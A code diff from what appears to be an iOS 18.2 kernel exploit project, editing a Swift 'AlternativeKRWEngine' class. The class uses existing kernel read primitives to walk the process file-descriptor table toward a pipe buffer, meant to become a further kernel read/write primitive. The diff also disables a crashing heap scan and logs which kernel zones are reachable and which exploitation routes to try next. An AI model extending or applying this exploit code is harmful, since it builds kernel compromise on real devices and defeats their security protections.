@@ -249,13 +249,15 @@ class AlternativeKRWEngine: ObservableObject {
     }
     
     /// Follow fd_ofiles → fileproc → fg_data → pipe → buffer
+    /// SAFETY: Only reads addresses that pass ds_isvalid() check
     private func findPipeFromOfiles(ofiles: UInt64, pipeFD: Int32, marker: UInt64) {
         // Read fileproc for our pipe fd
         let fpAddr = ds_kread64(ofiles + UInt64(pipeFD) * 8)
         log(String(format: "fileproc[%d]: 0x%llx", pipeFD, fpAddr))
         
         guard fpAddr != 0 && ds_isvalid(fpAddr) else {
-            log("❌ fileproc is NULL")
+            log("❌ fileproc is NULL or invalid")
+            log("   fd table structure may differ on iOS 18.2")
             scanForPipeBuffer(proc: ds_get_our_proc(), pipeFD: pipeFD, marker: marker)
             return
         }
@@ -274,16 +276,16 @@ class AlternativeKRWEngine: ObservableObject {
                 guard fg_data != 0 && ds_isvalid(fg_data) else { continue }
                 
                 // fg_data is the pipe struct — scan it for our marker
+                // ONLY read pointers that pass ds_isvalid
                 log(String(format: "  Trying fp_glob(+0x%llx)=0x%llx → fg_data(+0x%llx)=0x%llx", fpOff, fp_glob, fgOff, fg_data))
                 
-                // Scan pipe struct for buffer pointer containing our marker
-                for pipeOff in stride(from: 0, through: 0x100, by: 8) {
+                for pipeOff in stride(from: 0, through: 0x80, by: 8) {
                     let ptr = ds_kread64(fg_data + UInt64(pipeOff))
                     if ptr != 0 && ds_isvalid(ptr) {
+                        // Use ds_kread64_safe to avoid panic on bad addresses
                         let val = ds_kread64_safe(ptr)
                         if val == marker {
                             log(String(format: "✅ FOUND pipe buffer at pipe+0x%x → 0x%llx (marker verified!)", pipeOff, ptr))
-                            log(String(format: "   Path: fileproc+0x%llx → fp_glob+0x%llx → pipe+0x%x → buffer", fpOff, fgOff, pipeOff))
                             pipeBufferKaddr = ptr
                             DispatchQueue.main.async { self.pipeKRWReady = true }
                             recordResult(primitive: "Pipe Buffer", action: "setup", addr: ptr, val: marker, success: true, msg: "Buffer located via fd table walk")
@@ -295,46 +297,24 @@ class AlternativeKRWEngine: ObservableObject {
         }
         
         log("❌ Could not find pipe buffer via fd table walk")
-        log("   Pipe buffer may use inline storage on iOS 18")
+        log("   Pipe buffer likely in different kalloc zone (inaccessible via socket KRW)")
+        scanForPipeBuffer(proc: ds_get_our_proc(), pipeFD: pipeFD, marker: marker)
     }
     
-    /// Brute-force scan: search kernel heap near our proc for the pipe marker
+    /// Brute-force scan: DISABLED — causes crash on iOS 18.2
+    /// Socket KRW cannot safely read arbitrary heap addresses
+    /// The fd table walk above is the only safe approach
     private func scanForPipeBuffer(proc: UInt64, pipeFD: Int32, marker: UInt64) {
-        log("Scanning kernel heap for pipe marker 0x\(String(format: "%llx", marker))...")
-        log("   This scans nearby heap allocations (safe, read-only)")
-        
-        // Strategy: pipe buffers are allocated near other objects from our process
-        // Scan a range around our proc address
-        let scanBase = proc & 0xFFFFFFFFFFFF0000 // align to 64KB page
-        let scanSize: UInt64 = 0x40000 // 256KB range
-        
-        var found = false
-        for offset in stride(from: UInt64(0), to: scanSize, by: 0x1000) {
-            let pageBase = scanBase + offset
-            // Read first 8 bytes of each page to check if accessible
-            let firstVal = ds_kread64_safe(pageBase)
-            if firstVal == 0 { continue } // skip empty/inaccessible pages
-            
-            // Scan this page for our marker
-            for innerOff in stride(from: UInt64(0), to: 0x1000, by: 8) {
-                let addr = pageBase + innerOff
-                let val = ds_kread64_safe(addr)
-                if val == marker {
-                    log(String(format: "✅ FOUND marker at 0x%llx (heap scan)", addr))
-                    pipeBufferKaddr = addr
-                    DispatchQueue.main.async { self.pipeKRWReady = true }
-                    recordResult(primitive: "Pipe Buffer", action: "heap_scan", addr: addr, val: marker, success: true, msg: "Found via heap scan")
-                    found = true
-                    return
-                }
-            }
-        }
-        
-        if !found {
-            log("❌ Marker not found in 256KB scan range")
-            log("   Pipe buffer may be in a different zone/region")
-            recordResult(primitive: "Pipe Buffer", action: "heap_scan", addr: scanBase, val: 0, success: false, msg: "Marker not found in scan range")
-        }
+        log("⚠️ Heap scan SKIPPED — socket KRW panics on non-heap-zone reads")
+        log("   Pipe buffer is likely in a different kalloc zone than socket PCBs")
+        log("   This is a KNOWN LIMITATION of socket KRW on iOS 18.2:")
+        log("   - CAN read: proc, task, ucred, socket PCBs")
+        log("   - CANNOT read: pipe buffers, IPC ports, IOKit objects")
+        log("")
+        log("   → This confirms pipe buffer is in an inaccessible zone")
+        log("   → Pipe KRW primitive NOT viable with current socket KRW")
+        log("   → Need alternative: IOSurface mapping or mach_msg OOL")
+        recordResult(primitive: "Pipe Buffer", action: "scan_skipped", addr: proc, val: 0, success: false, msg: "Socket KRW cannot access pipe buffer zone")
     }
     
     /// Scan nearby offsets to find pipe buffer data pointer
